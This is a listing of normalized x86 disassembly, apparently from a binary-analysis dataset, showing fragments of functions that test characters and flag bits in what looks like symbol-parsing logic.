test [ rw-data ] esi
jne r-xdata
and eax 0x6000
and eax esi
sub eax 0x800
jmp r-xdata
push r--data
jmp r-xdata
and eax 0x1000
and eax 0x400
jmp r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
mov eax ebx
je r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
test eax eax
je r-xdata
push r--data
lea ecx [ ebp - 0x34 ]
call sub_411021
lea eax [ ebp - 0x54 ]
push eax
call sub_4128ea
mov edx [ rw-data ]
mov eax edx
pop ecx
mov ecx edx
shr eax 0x1
shr ecx 0x4
not eax
not ecx
and ecx eax
test cl 0x1
je r-xdata
lea eax [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
push 0x2c
lea ecx [ ebp - 0x44 ]
call sub_4107fa
mov ecx eax
call sub_410e7f
mov eax [ ebp - 0x4c ]
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x54 ] eax
mov eax [ ebp - 0x48 ]
push r--data
mov [ ebp - 0x50 ] eax
call sub_411021
lea eax [ ebp - 0x54 ]
push eax
lea ecx [ ebp - 0x34 ]
call sub_410f29
and eax edx
and eax 0x400
jmp r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
mov eax ebx
je r-xdata
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x64 ]
push eax
call sub_41388b
pop ecx
pop ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x4 ] eax
mov edx ebx
xor eax eax
and edx 0x1b00
mov ecx edi
cmp edx 0x1100
sete al
neg ecx
sbb ecx ecx
test eax ecx
jne r-xdata
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov eax ecx
shr eax 0x1
not eax
test al 0x1
je r-xdata
mov eax ebx
and eax 0x700
cmp eax 0x200
je r-xdata
lea eax [ ebp - 0x2c ]
push 0x1
push eax
call sub_413322
mov eax [ ebp - 0x2c ]
mov edx [ ebp - 0x10 ]
pop ecx
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x28 ]
pop ecx
mov [ ebp - 0x28 ] eax
mov eax ebx
and eax 0x700
cmp eax 0x600
jne r-xdata
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
test esi edx
jne r-xdata
test edi edi
jne r-xdata
mov eax ebx
mov ecx edi
and eax 0x1b00
sub eax 0x1200
neg eax
sbb eax eax
inc eax
neg ecx
sbb ecx ecx
test eax ecx
je r-xdata
test eax eax
je r-xdata
and eax 0x6000
and eax esi
sub eax 0x800
jmp r-xdata
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x54 ]
push eax
push r--data
lea ecx [ ebp - 0x64 ]
call sub_410873
mov ecx eax
call sub_410e7f
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x50 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x34 ] eax
xor eax eax
mov ecx edi
cmp edx 0x1200
sete al
neg ecx
sbb ecx ecx
test eax ecx
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
call sub_4128ea
pop ecx
push eax
lea ecx [ ebp - 0x34 ]
call sub_41110c
shr ecx 0x4
not ecx
test cl 0x1
je r-xdata
mov eax [ rw-data ]
and eax 0x60
cmp al 0x60
lea eax [ ebp - 0x18 ]
push eax
je r-xdata
test edx edx
je r-xdata
lea eax [ ebp - 0x2c ]
push 0x1
push eax
call sub_413322
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x4c ] eax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x48 ] eax
lea eax [ ebp - 0x2c ]
push 0x1
push eax
call sub_413322
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x54 ] eax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x50 ] eax
lea eax [ ebp - 0x2c ]
push 0x1
push eax
call sub_413322
add esp 0x18
jmp r-xdata
mov eax ebx
mov esi 0x1800
test edi edi
je r-xdata
lea eax [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
push 0x20
lea ecx [ ebp - 0x44 ]
call sub_4107fa
mov ecx eax
call sub_410e7f
mov eax [ ebp - 0x4c ]
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x54 ] eax
mov eax [ ebp - 0x48 ]
push 0x20
mov [ ebp - 0x50 ] eax
call sub_410f6c
mov eax [ ebp - 0x54 ]
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4c ] eax
mov eax [ ebp - 0x50 ]
mov [ ebp - 0x48 ] eax
lea eax [ ebp - 0x34 ]
push eax
call sub_410f29
mov ecx [ ebp - 0x4c ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp - 0x48 ]
jmp r-xdata
mov eax ebx
and eax 0x7c00
cmp eax 0x7800
jne r-xdata
push r--data
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax [ rw-data ]
shr eax 0x9
not eax
test al 0x1
je r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
je r-xdata
mov eax [ ebp - 0x50 ]
and eax 0xffff0000
mov [ ebp - 0x14 ] ecx
cmp [ ebp - 0x1c ] 0x0
mov [ ebp - 0x4 ] eax
push ecx
je r-xdata
cmp [ ebp - 0x34 ] ecx
je r-xdata
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
call sub_4128ea
pop ecx
mov ecx eax
call sub_410e7f
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x30 ] eax
jmp r-xdata
call sub_415921
pop ecx
push eax
lea ecx [ ebp - 0x44 ]
call sub_41110c
call sub_415921
pop ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x40 ] eax
jmp r-xdata
mov eax ebx
and eax 0x700
cmp eax 0x500
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x30 ] ecx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x34 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
and eax 0x6000
and eax esi
sub eax 0x800
jmp r-xdata
mov eax [ rw-data ]
shr eax 0x7
not eax
test al 0x1
je r-xdata
mov eax ebx
test edi edi
je r-xdata
push 0x8
mov ecx rw-data
call sub_413de0
mov ecx eax
mov [ ebp - 0x14 ] ecx
test ecx ecx
je r-xdata
lea eax [ ebp - 0x5c ]
push eax
call sub_414a18
pop ecx
pop ecx
push eax
lea eax [ ebp - 0x20 ]
push eax
push r--data
lea ecx [ ebp - 0x64 ]
call sub_410873
mov ecx eax
call sub_410e7f
lea eax [ ebp - 0x20 ]
push eax
lea ecx [ ebp - 0x34 ]
call sub_410f29
test [ rw-data ] 0x1000
jne r-xdata
mov eax [ esi ]
mov [ ebp - 0x34 ] eax
mov eax [ esi + 0x4 ]
mov [ ebp - 0x30 ] eax
test [ rw-data ] 0x1000
jne r-xdata
xor ecx ecx
cmp [ esi ] ecx
je r-xdata
lea eax [ ebp - 0x2c ]
push 0x1
push eax
call sub_413322
pop ecx
pop ecx
and eax 0x1000
and eax 0x400
jmp r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
mov eax ebx
je r-xdata
mov eax ebx
mov edx 0x800
test edi edi
je r-xdata
and eax 0x6000
and eax esi
sub eax 0x800
jmp r-xdata
xor esi esi
mov ecx esi
mov [ ebp - 0x14 ] esi
xor eax eax
mov [ ecx + 0x4 ] al
and [ ecx + 0x4 ] 0xffff00ff
mov [ ecx ] eax
jmp r-xdata
xor esi esi
push esi
lea eax [ ebp - 0x18 ]
push eax
push 0x20
lea ecx [ ebp - 0x8 ]
call sub_4107fa
mov ecx eax
call sub_410e7f
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x34 ]
call sub_410f29
xor ecx ecx
jmp r-xdata
test ebx 0x10000
je r-xdata
test [ rw-data ] 0x1000
jne r-xdata
test eax eax
je r-xdata
and eax 0x6000
and eax esi
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
test edi edi
je r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
mov eax ebx
test ecx ecx
je r-xdata
push ecx
lea eax [ ebp - 0x64 ]
push eax
call sub_414a18
pop ecx
pop ecx
mov esi [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
and eax 0x1000
and eax 0x400
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x54 ]
push eax
push r--data
lea ecx [ ebp - 0x64 ]
call sub_410873
mov ecx eax
call sub_410e7f
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x50 ]
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x54 ]
push eax
push r--data
lea ecx [ ebp - 0x64 ]
call sub_410873
mov ecx eax
call sub_410e7f
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x50 ]
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x30 ] edx
mov eax ebx
test edi edi
je r-xdata
test edi edi
je r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
je r-xdata
mov eax ebx
mov edx 0x6000
and eax edx
mov ecx 0x800
mov eax ebx
and eax 0x700
cmp eax 0x100
je r-xdata
xor eax eax
inc eax
mov eax ebx
and eax 0x700
sub eax 0x200
neg eax
sbb eax eax
inc eax
jmp r-xdata
lea eax [ ebp - 0x64 ]
push eax
call sub_412170
pop ecx
push eax
lea eax [ ebp - 0x4c ]
push eax
push 0x28
lea ecx [ ebp - 0x5c ]
call sub_4107fa
mov ecx eax
call sub_410e7f
mov eax [ ebp - 0x4c ]
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x54 ] eax
mov eax [ ebp - 0x48 ]
push 0x29
mov [ ebp - 0x50 ] eax
call sub_410f6c
lea eax [ ebp - 0x54 ]
push eax
lea ecx [ ebp - 0x34 ]
call sub_410f29
mov eax [ ebp - 0x10 ]
test eax eax
je r-xdata
test ecx ecx
je r-xdata
test eax eax
je r-xdata
and eax 0x6000
and eax esi
sub eax edx
jmp r-xdata
mov ecx ebx
and ecx esi
sub ecx edx
neg ecx
sbb ecx ecx
inc ecx
mov eax ebx
xor ecx ecx
and al 0xc0
cmp al 0x40
sete cl
jmp r-xdata
and eax 0x1000
and eax 0x400
jmp r-xdata
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x54 ]
push eax
push r--data
lea ecx [ ebp - 0x64 ]
call sub_410873
mov ecx eax
call sub_410e7f
mov eax [ ebp - 0x54 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x50 ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x30 ] eax
test edi edi
je r-xdata
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x54 ]
push eax
push r--data
lea ecx [ ebp - 0x64 ]
call sub_410873
mov ecx eax
call sub_410e7f
mov eax [ ebp - 0x54 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x50 ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x30 ] eax
test eax eax
je r-xdata
mov eax [ rw-data ]
shr eax 0x13
not eax
test al 0x1
lea eax [ ebp - 0x64 ]
push eax
je r-xdata
mov eax ebx
and eax 0x700
cmp eax 0x200
je r-xdata
push r--data
lea ecx [ ebp - 0x34 ]
call sub_411021
mov eax ebx
and eax 0x700
cmp eax 0x600
jne r-xdata
mov eax ebx
test edi edi
je r-xdata
test edi edi
je r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
je r-xdata
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x54 ]
push eax
push r--data
jmp r-xdata
test ecx ecx
je r-xdata
mov eax ebx
test edi edi
je r-xdata
test eax eax
je r-xdata
mov eax ebx
mov ecx 0x800
and eax esi
mov edx 0x6000
sub eax ecx
jmp r-xdata
call sub_414926
pop ecx
push eax
lea ecx [ ebp - 0x34 ]
call sub_41110c
call sub_414926
pop ecx
push eax
lea ecx [ ebp - 0x34 ]
call sub_410f29
jmp r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea ecx [ ebp - 0x34 ]
call sub_410f29
test ecx ecx
je r-xdata
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push r--data
lea ecx [ ebp - 0x64 ]
call sub_410873
mov ecx eax
call sub_410e7f
mov eax [ ebp - 0x20 ]
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4c ] eax
mov eax [ ebp - 0x1c ]
push 0x2c
mov [ ebp - 0x48 ] eax
call sub_410f6c
mov eax [ ebp - 0x4c ]
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x48 ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x54 ]
push eax
call sub_410f29
mov eax [ ebp - 0x20 ]
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x54 ] eax
mov eax [ ebp - 0x1c ]
push 0x2c
mov [ ebp - 0x50 ] eax
call sub_410f6c
mov eax [ ebp - 0x54 ]
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4c ] eax
mov eax [ ebp - 0x50 ]
mov [ ebp - 0x48 ] eax
lea eax [ ebp - 0x3c ]
push eax
call sub_410f29
jmp r-xdata
and eax 0x6000
and eax esi
sub eax edx
jmp r-xdata
mov ecx ebx
and ecx esi
sub ecx 0x1000
neg ecx
sbb ecx ecx
inc ecx
mov eax ebx
xor ecx ecx
and al 0xc0
cmp al 0x80
sete cl
jmp r-xdata
lea ecx [ ebp - 0x64 ]
call sub_410873
mov ecx eax
call sub_410e7f
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x50 ]
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x30 ] edx
jmp r-xdata
and eax edx
and eax esi
sub eax ecx
jmp r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
mov eax ebx
je r-xdata
call sub_41595b
pop ecx
push eax
lea ecx [ ebp - 0x34 ]
call sub_41110c
call sub_41595b
pop ecx
push eax
lea ecx [ ebp - 0x34 ]
call sub_410f29
jmp r-xdata
mov eax [ rw-data ]
shr eax 0x8
not eax
test al 0x1
lea eax [ ebp - 0x64 ]
push eax
je r-xdata
mov eax ebx
and eax 0x700
cmp eax 0x500
jne r-xdata
mov eax [ ebp - 0x4c ]
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x54 ] eax
mov eax [ ebp - 0x48 ]
push 0x2c
mov [ ebp - 0x50 ] eax
call sub_410f6c
lea eax [ ebp - 0x54 ]
push eax
lea ecx [ ebp - 0x34 ]
call sub_410f29
jmp r-xdata
test edi edi
je r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
je r-xdata
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x54 ]
push eax
push r--data
test ecx ecx
je r-xdata
mov eax ebx
test edi edi
je r-xdata
mov eax ebx
test edi edi
je r-xdata
mov eax ebx
and eax 0x700
cmp eax 0x500
je r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x14 ]
test ecx ecx
je r-xdata
lea eax [ ebp - 0x64 ]
push eax
call sub_413459
pop ecx
push eax
lea ecx [ ebp - 0x34 ]
call sub_41110c
mov eax [ rw-data ]
shr eax 0x2
not eax
test al 0x1
je r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x4c ]
push eax
push r--data
lea ecx [ ebp - 0x64 ]
call sub_410873
mov ecx eax
call sub_410e7f
mov eax [ ebp - 0x24 ]
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x54 ] eax
mov eax [ ebp - 0x28 ]
push r--data
mov [ ebp - 0x50 ] eax
call sub_411021
lea eax [ ebp - 0x54 ]
push eax
lea ecx [ ebp - 0x34 ]
call sub_410f29
mov eax ebx
and eax esi
neg eax
sbb eax eax
inc eax
push 0x0
test bl 0xc0
pop eax
sete al
jmp r-xdata
and eax edx
and eax esi
sub eax ecx
jmp r-xdata
mov eax [ ebp - 0x34 ]
mov [ ecx ] eax
mov eax [ ebp - 0x30 ]
mov [ ecx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x34 ] esi
jmp r-xdata
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x54 ]
push eax
push r--data
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
test edi edi
je r-xdata
mov eax ebx
and eax 0x700
cmp eax 0x600
je r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
je r-xdata
mov [ ebp - 0x30 ] eax
and eax edx
and eax esi
sub eax ecx
jmp r-xdata
mov eax ebx
and eax 0x700
cmp eax 0x400
jne r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
je r-xdata
sub_411f88
push ebp
mov ebp esp
push esi
mov esi ecx
push edi
xor edi edi
cmp [ esi ] edi
je r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
and [ esi + 0x4 ] 0xffff00ff
mov [ esi + 0x4 ] 0x3
mov [ esi ] edi
jmp r-xdata
mov [ esi + 0x4 ] 0x2
cmp [ ebp + 0xc ] edi
je r-xdata
pop edi
pop esi
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
sub eax edi
je r-xdata
mov [ esi + 0x4 ] 0x3
jmp r-xdata
mov ecx rw-data
push edi
sub eax 0x1
je r-xdata
pop ebx
push 0x8
call sub_413de0
test eax eax
je r-xdata
push 0xc
call sub_413de0
test eax eax
je r-xdata
mov eax edi
mov cl [ ebx ]
mov [ eax ] r--data
mov [ eax + 0x4 ] cl
jmp r-xdata
mov [ esi ] edi
test edi edi
jmp r-xdata
push [ ebp + 0xc ]
mov ecx eax
push ebx
call sub_410afc
mov edi eax
mov [ esi ] eax
test eax eax
jne r-xdata
sub_412064
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
inc ebx
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
and [ esi + 0x4 ] 0xffff00ff
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
push edi
pop edi
cmp cl 0x5a
je r-xdata
test ebx ebx
je r-xdata
push 0x2c
mov ecx esi
call sub_410f6c
mov eax [ rw-data ]
xor ebx ebx
jmp r-xdata
push 0x1
mov ecx esi
call sub_411082
movsx ecx cl
sub ecx 0x30
cmp ecx 0x9
ja r-xdata
mov cl [ eax ]
test cl cl
je r-xdata
and [ ebp - 0x8 ] 0x0
mov edi eax
and [ ebp - 0x4 ] 0xffff0000
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_414531
mov eax [ rw-data ]
sub eax edi
pop ecx
pop ecx
cmp eax 0x1
jle r-xdata
inc eax
mov [ rw-data ] eax
lea eax [ ebp - 0x18 ]
push ecx
mov ecx [ rw-data ]
push eax
call sub_410c5c
push eax
mov ecx esi
call sub_410f29
jmp r-xdata
lea eax [ ebp - 0x10 ]
mov ecx esi
push eax
call sub_410f29
mov eax [ rw-data ]
cmp eax edi
jne r-xdata
mov ecx [ rw-data ]
cmp [ ecx ] 0x9
je r-xdata
mov eax [ rw-data ]
cmp [ esi + 0x4 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0xffff00ff
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x2
lea eax [ ebp - 0x10 ]
push eax
call sub_4110c2
mov cl [ eax ]
cmp cl 0x40
je r-xdata
jmp r-xdata
sub_412170
push ebp
mov ebp esp
mov eax [ rw-data ]
sub esp 0x10
movsx ecx [ eax ]
sub ecx 0x58
je r-xdata
inc eax
mov [ rw-data ] eax
push r--data
dec ecx
sub ecx 0x1
je r-xdata
inc eax
mov [ rw-data ] eax
mov eax [ rw-data ]
shr eax 0x12
not eax
test al 0x1
mov eax r--data
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
call sub_412064
mov edx [ ebp - 0x4 ]
pop ecx
test dl dl
jne r-xdata
push eax
jmp r-xdata
mov eax r--data
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ rw-data ]
mov cl [ eax ]
test cl cl
je r-xdata
mov ecx [ ebp + 0x8 ]
call sub_410873
mov esp ebp
pop ebp
retn
cmp cl 0x40
je r-xdata
inc eax
mov [ rw-data ] eax
cmp cl 0x5a
je r-xdata
inc eax
mov [ rw-data ] eax
mov eax [ rw-data ]
shr eax 0x12
not eax
test al 0x1
mov eax r--data
jne r-xdata
mov ecx [ ebp + 0x8 ]
push 0x2
call sub_4108ad
jmp r-xdata
push eax
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
call sub_410ee5
mov edx [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ edx ] ecx
mov ecx [ eax + 0x4 ]
mov eax edx
mov [ edx + 0x4 ] ecx
jmp r-xdata
mov eax r--data
mov eax [ ebp + 0x8 ]
sub_412250
push ebp
mov ebp esp
mov eax [ rw-data ]
sub esp 0x30
cmp [ eax ] 0x0
push esi
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
call sub_413e6e
mov esi eax
test esi esi
jns r-xdata
lea eax [ ebp - 0x30 ]
push 0x5d
push eax
lea eax [ ebp - 0x28 ]
lea ecx [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push 0x28
lea ecx [ ebp - 0x30 ]
call sub_4107fa
mov ecx eax
call sub_410e7f
mov eax [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
push r--data
mov [ ebp - 0x14 ] eax
call sub_411021
mov eax [ ebp - 0x18 ]
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
push 0x1
mov [ ebp - 0xc ] eax
call sub_411082
mov eax [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push 0x5d
mov [ ebp - 0x4 ] eax
call sub_410f6c
lea eax [ ebp - 0x8 ]
jmp r-xdata
jne r-xdata
xor esi esi
test esi esi
push eax
push [ ebp + 0x8 ]
call sub_4124eb
mov eax [ ebp + 0x8 ]
pop ecx
pop ecx
mov eax [ ebp - 0x4 ]
and [ ebp - 0x8 ] 0x0
and eax 0xffff0000
push edi
mov edi [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
test [ edi + 0x4 ] 0x800
je r-xdata
lea eax [ ebp - 0x20 ]
push 0x5d
push eax
lea eax [ ebp - 0x18 ]
lea ecx [ ebp - 0x10 ]
jmp r-xdata
cmp al 0x1
jg r-xdata
push r--data
lea ecx [ ebp - 0x8 ]
call sub_411021
mov eax [ ebp - 0x4 ]
push 0x1
push eax
push 0x5b
call sub_4107fa
mov ecx eax
call sub_410f07
mov ecx eax
call sub_410ea1
cmp [ edi ] 0x0
je r-xdata
mov eax esi
dec esi
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_414531
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x1c ]
pop ecx
pop ecx
mov ecx [ ebp - 0x20 ]
or edx 0x800
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
pop edi
jmp r-xdata
test [ edi + 0x4 ] 0x800
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
push edi
lea eax [ ebp - 0x18 ]
push eax
push 0x28
lea ecx [ ebp - 0x30 ]
call sub_4107fa
mov ecx eax
call sub_410e7f
mov eax [ ebp - 0x18 ]
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
push 0x29
mov [ ebp - 0xc ] eax
call sub_410f6c
mov eax [ ebp - 0x10 ]
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x8 ]
push eax
call sub_410f29
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
lea eax [ ebp - 0x8 ]
mov ecx edi
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_410e7f
mov ecx [ eax ]
mov [ ebp - 0x8 ] ecx
mov eax [ eax + 0x4 ]
jmp r-xdata
lea eax [ ebp - 0x28 ]
push 0x0
push eax
call sub_413322
pop ecx
pop ecx
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0x5b
lea ecx [ ebp - 0x30 ]
call sub_4107fa
mov ecx eax
call sub_410e7f
mov eax [ ebp - 0x10 ]
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
push 0x5d
mov [ ebp - 0x14 ] eax
call sub_410f6c
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x8 ]
call sub_410f29
cmp [ ebp - 0x4 ] 0x1
jle r-xdata
mov [ ebp - 0x4 ] eax
sub_412452
push ebp
mov ebp esp
sub esp 0x10
push 0x0
call sub_41117e
pop ecx
push eax
lea ecx [ ebp - 0x8 ]
call sub_410873
mov ecx [ rw-data ]
mov al [ ecx ]
test al al
je r-xdata
push 0x1
lea ecx [ ebp - 0x8 ]
call sub_411082
movsx eax al
inc ecx
mov [ rw-data ] ecx
sub eax 0x30
je r-xdata
push r--data
lea ecx [ ebp - 0x8 ]
call sub_411021
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
push r--data
lea ecx [ ebp - 0x8 ]
call sub_411021
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
lea eax [ ebp - 0x10 ]
push eax
call sub_414e25
pop ecx
push eax
lea ecx [ ebp - 0x8 ]
call sub_410f29
jmp r-xdata
sub eax 0x3
jne r-xdata
mov ecx [ ebp + 0x8 ]
push 0x2
call sub_4108ad
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_4124eb
push ebp
mov ebp esp
mov ecx [ rw-data ]
sub esp 0x1c
mov al [ ecx ]
push ebx
push esi
push edi
test al al
je r-xdata
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x8 ]
call sub_410e5b
add esp 0xc
and [ ebp - 0xc ] 0x0
mov edi 0xffff0000
and [ ebp - 0x8 ] edi
inc ecx
movzx esi al
or ebx 0xffffffff
push 0x4e
mov eax esi
mov [ rw-data ] ecx
pop edx
mov [ ebp - 0x1 ] 0x0
cmp eax edx
jg r-xdata
cmp eax 0x4f
je r-xdata
je r-xdata
push r--data
lea ecx [ ebp - 0xc ]
call sub_410bf5
jle r-xdata
push r--data
lea ecx [ ebp - 0xc ]
call sub_411021
sub eax 0x43
cmp eax 0xa
ja r-xdata
mov ecx [ ebp + 0xc ]
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] edi
mov eax [ ecx ]
mov [ ebp - 0x1c ] eax
mov eax [ ecx + 0x4 ]
mov [ ebp - 0x18 ] eax
cmp ebx 0xfffffffe
jne r-xdata
mov bl [ ebp - 0x1 ]
lea eax [ ebp - 0x1c ]
dec ecx
push eax
mov [ rw-data ] ecx
call sub_4134c8
pop ecx
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
test ecx ecx
jne r-xdata
cmp eax 0x53
jle r-xdata
movzx eax [ eax + lookup_table_4128cb ]
jmp [ eax * 4 + jump_table_4128b3 ]
cmp [ ecx ] 0x0
jne r-xdata
mov esi 0x800
or eax esi
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x1c ]
push r--data
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x14 ]
push eax
call sub_41480e
mov edx [ ebp - 0x10 ]
add esp 0x10
test esi edx
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push r--data
push 0x2
pop ecx
sub esi ecx
je r-xdata
jmp r-xdata
mov ebx esi
and ebx 0x3
jmp r-xdata
cmp eax 0x58
je r-xdata
push r--data
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0xc ]
push eax
push [ ebp + 0x8 ]
call sub_41480e
add esp 0x10
jmp r-xdata
test bl 0x1
je r-xdata
mov ecx [ ebp - 0x14 ]
jmp r-xdata
push r--data
lea ecx [ ebp - 0x14 ]
call sub_411021
mov edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
mov [ eax ] ecx
mov ecx [ ebp - 0x8 ]
